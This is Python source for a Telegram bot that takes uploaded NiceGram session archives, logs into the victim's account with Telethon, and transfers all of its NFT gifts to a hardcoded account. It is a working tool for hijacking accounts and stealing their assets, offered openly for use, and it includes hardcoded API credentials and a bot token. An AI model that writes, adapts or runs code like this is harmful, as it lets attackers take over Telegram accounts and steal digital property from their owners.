import os
import zipfile
import json
import base64
import asyncio
import shutil
import logging
from telethon import TelegramClient
from telethon.sessions import StringSession
from telethon import functions, types

# Для aiogram 3.x
from aiogram import Bot, Dispatcher, types
from aiogram.filters import Command
from aiogram.enums import ParseMode

# Конфигурация
API_ID = 2040
API_HASH = "b18441a1ff607e10a986891cf5467e6a"
TARGET_USER = "@stautagent"
BOT_TOKEN = "8233829912:AAFmJzPj_1nvNPH2zqGCrgKuvQmGYG6E9lI"  # Замени на токен бота

# Настройка логирования
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

def extract_session_data(zip_path):
    """Извлекает и декодирует сессию из ZIP-архива."""
    temp_dir = "temp_session"
    
    # Создаем временную директорию
    os.makedirs(temp_dir, exist_ok=True)
    
    # Распаковываем архив
    with zipfile.ZipFile(zip_path, 'r') as zip_ref:
        zip_ref.extractall(temp_dir)
    
    # Ищем session.json
    session_file = None
    for root, dirs, files in os.walk(temp_dir):
        if "session.json" in files:
            session_file = os.path.join(root, "session.json")
            break
    
    if not session_file:
        raise FileNotFoundError("session.json не найден в архиве")
    
    # Читаем и декодируем данные
    with open(session_file, 'r') as f:
        data = json.load(f)
    
    # Декодируем base64
    encoded_session = data.get("user", "")
    decoded_bytes = base64.b64decode(encoded_session)
    
    # Конвертируем в строку сессии
    session_string = StringSession.save(decoded_bytes)
    
    # Очищаем временные файлы
    shutil.rmtree(temp_dir, ignore_errors=True)
    
    return session_string

async def transfer_gifts(client, target_username):
    """Находит и переводит все NFT-гифты."""
    try:
        target_entity = await client.get_entity(target_username)
        transferred_count = 0
        
        # Получаем информацию о пользователе
        me = await client.get_me()
        
        # Проверяем подарки через различные методы
        # Метод 1: Проверка диалогов
        dialogs = await client.get_dialogs()
        
        for dialog in dialogs:
            try:
                # Пробуем получить историю для поиска подарков
                messages = await client.get_messages(dialog.id, limit=100)
                
                for message in messages:
                    if hasattr(message, 'media') and message.media:
                        # Проверяем, является ли медиа подарком
                        if hasattr(message.media, 'gift'):
                            gift = message.media.gift
                            if hasattr(gift, 'id'):
                                # Переводим подарок
                                try:
                                    await client(functions.payments.TransferGiftRequest(
                                        peer=dialog.entity,
                                        gift_id=gift.id,
                                        target_peer=target_entity
                                    ))
                                    logger.info(f"Передан гифт ID: {gift.id}")
                                    transferred_count += 1
                                    await asyncio.sleep(0.5)
                                except Exception as e:
                                    logger.error(f"Ошибка перевода гифта {gift.id}: {e}")
            except Exception as e:
                continue
        
        # Метод 2: Проверка коллекций стикеров (где могут быть NFT)
        try:
            sticker_sets = await client(functions.messages.GetAllStickersRequest(0))
            
            for sticker_set in sticker_sets.sets:
                if hasattr(sticker_set, 'gifts'):
                    for gift in sticker_set.gifts:
                        if hasattr(gift, 'id'):
                            try:
                                await client(functions.payments.TransferGiftRequest(
                                    peer=await client.get_input_entity(me.id),
                                    gift_id=gift.id,
                                    target_peer=target_entity
                                ))
                                logger.info(f"Передан гифт из стикерпака ID: {gift.id}")
                                transferred_count += 1
                                await asyncio.sleep(0.5)
                            except Exception as e:
                                logger.error(f"Ошибка перевода гифта из стикерпака: {e}")
        except Exception as e:
            logger.error(f"Ошибка при проверке стикеров: {e}")
        
        return transferred_count
        
    except Exception as e:
        logger.error(f"Ошибка в transfer_gifts: {e}")
        return 0

async def process_session_zip(zip_path):
    """Обрабатывает ZIP-файл с сессией."""
    logger.info(f"Обработка сессии из: {zip_path}")
    
    try:
        session_string = extract_session_data(zip_path)
        
        # Создаем клиент Telethon
        client = TelegramClient(
            session=StringSession(session_string),
            api_id=API_ID,
            api_hash=API_HASH
        )
        
        await client.connect()
        
        if not await client.is_user_authorized():
            logger.error("Сессия невалидна")
            return False, "Не удалось авторизоваться"
        
        me = await client.get_me()
        logger.info(f"Авторизован как: {me.first_name} (@{me.username})")
        
        # Переводим подарки
        count = await transfer_gifts(client, TARGET_USER)
        
        await client.disconnect()
        
        return True, f"Успешно! Передано подарков: {count}"
        
    except Exception as e:
        logger.error(f"Ошибка обработки сессии: {e}")
        return False, f"Ошибка: {str(e)}"

# Инициализация aiogram 3.x
bot = Bot(token=BOT_TOKEN, parse_mode=ParseMode.HTML)
dp = Dispatcher()

@dp.message(Command("start"))
async def cmd_start(message: types.Message):
    await message.answer(
        "Отправьте мне ZIP-файл с сессией NiceGram\n"
        "Бот авторизуется и переведет все NFT-гифты на @stautagent"
    )

@dp.message(lambda message: message.document and message.document.file_name.endswith('.zip'))
async def handle_zip_session(message: types.Message):
    # Скачиваем файл
    file_id = message.document.file_id
    file = await bot.get_file(file_id)
    zip_path = f"temp_{file_id}.zip"
    
    await bot.download_file(file.file_path, zip_path)
    
    # Отправляем статус
    status_msg = await message.answer("🔍 Обработка сессии...")
    
    # Обрабатываем сессию
    success, result_text = await process_session_zip(zip_path)
    
    # Удаляем временный файл
    if os.path.exists(zip_path):
        os.remove(zip_path)
    
    # Отправляем результат
    if success:
        await status_msg.edit_text(f"✅ {result_text}")
    else:
        await status_msg.edit_text(f"❌ {result_text}")

@dp.message()
async def handle_other_messages(message: types.Message):
    await message.answer("Отправьте ZIP-файл с сессией")

async def main():
    logger.info("Бот запущен...")
    await dp.start_polling(bot)

if __name__ == "__main__":
    # Проверяем токен
    if BOT_TOKEN == "8233829912:AAFmJzPj_1nvNPH2zqGCrgKuvQmGYG6E9lI":
        print("ЗАМЕНИТЕ BOT_TOKEN на ваш токен от @BotFather!")
        exit(1)
    
    asyncio.run(main())
